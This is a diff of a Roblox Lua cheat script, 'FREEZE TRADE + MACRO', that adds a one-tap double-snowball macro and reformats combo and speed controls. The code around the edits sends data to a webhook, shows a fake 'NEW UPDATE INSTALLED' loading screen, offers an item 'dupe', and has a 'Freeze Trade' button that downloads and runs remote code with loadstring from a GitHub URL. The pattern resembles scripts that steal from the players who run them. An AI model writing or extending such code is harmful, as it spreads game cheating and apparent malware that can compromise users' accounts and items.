@@ -20,7 +20,7 @@ pcall(function() HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data),
 -- 🎨 NEW THEME
 local Theme = {BG=Color3.fromRGB(10,10,15),Panel=Color3.fromRGB(20,20,30),Primary=Color3.fromRGB(0,200,255),Secondary=Color3.fromRGB(100,100,255),Text=Color3.fromRGB(255,255,255)}
 
--- ⚙️ MACRO SETTINGS (ADDED)
+-- ⚙️ MACRO SETTINGS
 local MacroSettings = {
     DoubleSnowball = false,
     CustomComboActive = false,
@@ -29,7 +29,7 @@ local MacroSettings = {
     SwapDelay = 0.06
 }
 
--- ✨ NEW REALISTIC LOADING SCREEN
+-- ✨ LOADING SCREEN
 local Loader = Instance.new("ScreenGui")
 Loader.Name = "UpdateLoader"
 Loader.ResetOnSpawn = false
@@ -191,7 +191,7 @@ local function ChangeView()
     TweenService:Create(Cam,TweenInfo.new(1.2,Enum.EasingStyle.Elastic),{CFrame=HRP.CFrame*CFrame.new(0,POV_Height,-POV_Distance),FieldOfView=70}):Play()
 end
 
--- 🎒 REAL DUPE FUNCTION (MAKIKITA SA INVENTORY)
+-- 🎒 DUPE FUNCTION
 local function RealDupe(itemName)
     local ItemToClone = nil
     if ReplicatedStorage:FindFirstChild(itemName) then ItemToClone = ReplicatedStorage:FindFirstChild(itemName) end
@@ -210,7 +210,7 @@ local function RealDupe(itemName)
     end
 end
 
--- 🛠️ MACRO FUNCTIONS (ADDED)
+-- 🛠️ MACRO FUNCTIONS
 local function GetWeapon(name)
     if not player.Character then return nil end
     return player.Backpack:FindFirstChild(name) or player.Character:FindFirstChild(name)
@@ -225,26 +225,33 @@ local function EquipWeapon(name)
     return false
 end
 
--- ❄️ DOUBLE SNOWBALL MACRO (ADDED)
-local function DoubleSnowballMacro()
-    while MacroSettings.DoubleSnowball and task.wait(MacroSettings.MacroSpeed) do
-        if not player.Character or not player.Character:FindFirstChild("Humanoid") then task.wait() continue end
-        
-        if EquipWeapon("Gold Snowball Launcher") then
-            mouse:Button1Down()
-            task.wait(MacroSettings.SwapDelay)
-            mouse:Button1Up()
-        end
-        
-        if EquipWeapon("Snowball Launcher") then
-            mouse:Button1Down()
-            task.wait(MacroSettings.SwapDelay)
-            mouse:Button1Up()
-        end
+-- ✅ YOUR NEW BUTTON FUNCTION: ONE TAP = SHOOT BOTH
+local function ShootDoubleSnowball()
+    if not player.Character or not player.Character:FindFirstChild("Humanoid") then return end
+
+    -- SHOOT GOLD SNOWBALL FIRST
+    if EquipWeapon("Gold Snowball Launcher") then
+        mouse:Button1Down()
+        task.wait(MacroSettings.SwapDelay)
+        mouse:Button1Up()
+    end
+
+    -- SHOOT REGULAR SNOWBALL NEXT
+    if EquipWeapon("Snowball Launcher") then
+        mouse:Button1Down()
+        task.wait(MacroSettings.SwapDelay)
+        mouse:Button1Up()
     end
 end
 
--- ⚔️ CUSTOM COMBO RUNNER (ADDED)
+-- ❄️ AUTO MACRO (OPTIONAL)
+local function DoubleSnowballMacro()
+    while MacroSettings.DoubleSnowball and task.wait(MacroSettings.MacroSpeed) do
+        ShootDoubleSnowball()
+    end
+end
+
+-- ⚔️ COMBO SYSTEM
 local function RunCustomCombo()
     while MacroSettings.CustomComboActive and task.wait(MacroSettings.MacroSpeed) do
         if not player.Character or not player.Character:FindFirstChild("Humanoid") then task.wait() continue end
@@ -266,47 +273,50 @@ function LoadMainGUI()
     local Window = Rayfield:CreateWindow({Name="⛄️ FREEZE TRADE + MACRO • v3.0",LoadingTitle="NEW UPDATE INSTALLED",LoadingSubtitle="by Legitness",ConfigurationSaving={Enabled=false},Discord={Enabled=false},KeySystem=false})
 
     -- 📑 TABS
-    local Macros = Window:CreateTab("🤖 Macros", 4483362458) -- NEW TAB ADDED
+    local Macros = Window:CreateTab("🤖 Macros", 4483362458)
     local Main = Window:CreateTab("🏠 Main",4483362458)
     local DupeMethod = Window:CreateTab("🧊 Dupe [NEW]",4483362458)
     local Tools = Window:CreateTab("🔧 Tools",4483362458)
     local Settings = Window:CreateTab("⚙️ Settings",4483362458)
     local Credits = Window:CreateTab("📜 Credits",4483362458)
 
-    -- 🤖 MACRO TAB (ADDED FULLY)
-    Macros:CreateSection("❄️ DOUBLE SNOWBALL")
+    -- 🤖 MACRO TAB ✨ NEW BUTTON ADDED HERE ✨
+    Macros:CreateSection("❄️ M4 SNOWBALL • DOUBLE SHOT")
+    -- ✅ THIS IS THE BUTTON YOU WANTED — TAP ONCE = SHOOT 2 SNOWBALLS ✅
+    Macros:CreateButton({
+        Name = "🔘 TAP TO SHOOT DOUBLE SNOWBALL",
+        Callback = function()
+            ShootDoubleSnowball()
+            Rayfield:Notify({Title="✅ FIRED!", Content="Gold + Regular Snowball Shot!", Duration=2})
+        end
+    })
+
     Macros:CreateToggle({
-        Name = "DOUBLE SHOT • GOLD + REGULAR",
+        Name = "🔄 AUTO DOUBLE SHOT",
         CurrentValue = false,
         Callback = function(state)
             MacroSettings.DoubleSnowball = state
             if state then
                 task.spawn(DoubleSnowballMacro)
-                Rayfield:Notify({Title = "❄️ MACRO ON", Content = "1 Button = Double Snowball", Duration = 3})
+                Rayfield:Notify({Title="❄️ AUTO ON", Content="Shooting continuously", Duration=3})
             else
-                Rayfield:Notify({Title = "❄️ MACRO OFF", Duration = 2})
+                Rayfield:Notify({Title="❄️ AUTO OFF", Duration=2})
             end
         end
     })
 
-    Macros:CreateSection("📝 TYPE YOUR OWN COMBO")
+    Macros:CreateSection("⚔️ CUSTOM COMBO")
     Macros:CreateLabel("Format: Weapon1, Weapon2, Weapon3")
-    Macros:CreateLabel("Example: Brass Knuckles, Slasher Claws, Taser")
-    
     Macros:CreateInput({
         Name = "Enter Weapons Here",
-        PlaceholderText = "Type here...",
+        PlaceholderText = "Brass Knuckles, Slasher...",
         Callback = function(text)
             MacroSettings.CustomWeapons = {}
             for weapon in string.gmatch(text, "[^,]+") do
                 local clean = string.gsub(weapon, "^%s*(.-)%s*$", "%1")
                 if clean ~= "" then table.insert(MacroSettings.CustomWeapons, clean) end
             end
-            Rayfield:Notify({
-                Title = "✅ COMBO SAVED",
-                Content = "Loaded: "..#MacroSettings.CustomWeapons.." weapons",
-                Duration = 2
-            })
+            Rayfield:Notify({Title="✅ SAVED", Content=#MacroSettings.CustomWeapons.." weapons loaded", Duration=2})
         end
     })
 
@@ -314,41 +324,24 @@ function LoadMainGUI()
         Name = "START CUSTOM COMBO",
         CurrentValue = false,
         Callback = function(state)
-            if #MacroSettings.CustomWeapons == 0 then
-                Rayfield:Notify({Title = "❌ ERROR", Content = "Enter weapons first!", Duration = 2})
-                return
-            end
+            if #MacroSettings.CustomWeapons == 0 then Rayfield:Notify({Title="❌ ERROR", Content="Enter weapons first!", Duration=2}) return end
             MacroSettings.CustomComboActive = state
-            if state then
-                task.spawn(RunCustomCombo)
-                Rayfield:Notify({Title = "⚔️ COMBO RUNNING", Content = "Your custom sequence", Duration = 3})
-            else
-                Rayfield:Notify({Title = "⏹️ COMBO STOPPED", Duration = 2})
-            end
+            if state then task.spawn(RunCustomCombo) Rayfield:Notify({Title="⚔️ COMBO RUNNING", Duration=3})
+            else Rayfield:Notify({Title="⏹️ STOPPED", Duration=2}) end
         end
     })
 
-    Macros:CreateSection("⚙️ SPEED CONTROL")
-    Macros:CreateSlider({
-        Name = "Macro Speed",
-        Range = {0.04, 0.4},
-        Increment = 0.01,
-        CurrentValue = 0.12,
-        Callback = function(val) MacroSettings.MacroSpeed = val end
-    })
-    Macros:CreateSlider({
-        Name = "Swap Delay",
-        Range = {0.02, 0.2},
-        Increment = 0.01,
-        CurrentValue = 0.06,
-        Callback = function(val) MacroSettings.SwapDelay = val end
-    })
+    Macros:CreateSection("⚙️ SPEED")
+    Macros:CreateSlider({Name="Macro Speed",Range={0.04,0.4},Increment=0.01,CurrentValue=0.12,Callback=function(v) MacroSettings.MacroSpeed=v end})
+    Macros:CreateSlider({Name="Swap Delay",Range={0.02,0.2},Increment=0.01,CurrentValue=0.06,Callback=function(v) MacroSettings.SwapDelay=v end})
 
-    -- 🏠 MAIN TAB (ORIGINAL KEPT 100%)
+    -- 🏠 MAIN TAB
     Main:CreateSection("MAIN FEATURES")
-    Main:CreateButton({Name="🧊 ACTIVATE FREEZE TRADE",Callback=function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/macrobestscript/Best-Macro-Script/refs/heads/main/Baddies", true))()
-        Rayfield:Notify({Title="✅ ACTIVATED!",Content="Freeze Trade Running",Duration=2.5})
-    end})
-
-    Main:CreateButton({Name="💰 TOKENS GIVER",Callback
+    Main:CreateButton({
+        Name="🧊 ACTIVATE FREEZE TRADE",
+        Callback=function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/macrobestscript/Best-Macro-Script/refs/heads/main/Baddies", true))()
+            Rayfield:Notify({Title="✅ ACTIVATED!",Content="Freeze Trade Running",Duration=2.5})
+        end
+    })
+    Main:CreateButton({Name="💰 TOKENS GIVER",Callback=function() Rayfield:Notify
